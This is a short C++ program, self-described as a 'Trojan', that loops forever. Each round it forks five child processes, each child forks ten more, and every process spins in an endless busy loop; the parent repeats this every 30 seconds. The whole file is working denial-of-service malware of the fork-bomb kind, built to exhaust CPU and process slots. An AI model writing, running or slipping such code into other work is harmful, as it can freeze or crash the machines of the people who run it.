#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <bits/stdc++.h>
#include <signal.h>
#include <sys/wait.h>

using namespace std;
static void halt()
{
    while(1) __asm("");
}
int main()
{
    pid_t pid = getpid();
    cout <<"Trojan started with process id : " << pid << endl;
    while (1)
    {
        for (int i = 0; i < 5; i++)
        {
            // pid_t pid1;
            pid_t pid1 = fork() ;
            if (pid1 == 0)
            {
                // pid_t pid1 = getpid();
                cout << "Child is created at level 1 :  "<< getpid() << endl ; 
                for (int i = 0; i < 10; i++)
                {
                    // pid_t child_id;
                    pid_t pid2 = fork() ;
                    if( pid2 == 0 )
                    {
                        cout << "Child is created at level 2 : "<< getpid() << endl ;
                        halt() ;
                    }
                }
                halt() ;
            }
        }
        sleep(30) ;
    }
}